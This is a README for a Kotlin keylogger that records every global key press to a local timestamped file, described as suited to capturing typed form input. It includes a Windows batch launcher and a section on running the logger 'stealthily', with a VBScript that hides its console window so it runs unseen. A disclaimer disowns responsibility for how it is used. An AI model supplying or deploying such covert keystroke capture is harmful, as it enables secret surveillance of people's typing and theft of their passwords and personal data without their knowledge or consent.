# kotlin-keylogger
 A simple keylogger application implemented in Kotlin. It uses [Native Hook](https://github.com/kwhat/jnativehook) library to add global listener for key presses.

This project was optimized for capturing information entered using the keyboard (like forms and stuff), so in the log file you'll see the actual keys pressed (ex.: `!` instead of `[Shift]1`).

I am not responsible in any way regarding the usage of this software, it is provided as-is, and anything you do with it is your responsibility alone.

## Run

This is a Java (JVM) project, so you need to install [Java](https://adoptium.net/temurin/releases) to run it. 

You can achieve "double-click like" behavior by creating a shell script that runs the `.jar` file, for example, in `Windows` you would create this file called `run.bat` in the same folder as the `.jar` with the following contents:

```shell
@echo off
SETLOCAL EnableExtensions

java -Xms1m -Xmx1024m -jar "keylogger.jar"

pause>nul
endlocal
exit
```

Be aware that by default, the application will open in console mode (that is, "the black window"), so the software will be visible and can be stopped simply by closing its window.

### But how do I run it stealthily?

It depends on the OS you want to execute it. In `Windows`, for example, make sure to first create the `.bat` file (as described above), then you can create a file called `run.vbs` with the following contents:

```shell
Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "run.bat" & Chr(34), 0
Set WshShell = Nothing
```

If you execute this `.vbs` file, no console window ("the black window") will appear at all, and the software will be executed fully stealthily. This means that you'll have to kill the Java process when you want to stop the keylogger.

### Debug logs

If you set the environment variable `KEYLOGGER_DEBUG` to `true`, the program will also print a message for each key pressed, otherwise it'll just silently record the pressed keys to the file.

## FAQ
### How do I stop the program?

You can stop it in many ways, for example, you can close its window, kill its process, shutdown the PC, etc.

### Where do I find the logged keys?

When you run the program, a file named `keys-{current_date_time}.txt` will be created in the same directory that the jar file is in, this is where the program will record all pressed keys.

## Registered keys format rules

This software follow some simple rules regarding the format of the registered keys:

- Provide the actual representation of the character whenever possible (e.g.: `!` instead of `[Shift]1`).
- Pressing `Enter` will also jump a line in the log file (to improve readability).
- The representation `[key_name]` will only be used when there is no good equivalent for the key in the ASCII table.
- Not pressing anything for `5 seconds` will generate another timestamp block in the log when the next key is pressed, alongside the time difference between the last and current key press.

## Compile

To build the `.jar`, just execute this command, the compiled file will be in the `build/libs` folder.

```shell
./gradlew shadowJar
```

## License

This project is licensed under [MIT License](LICENSE).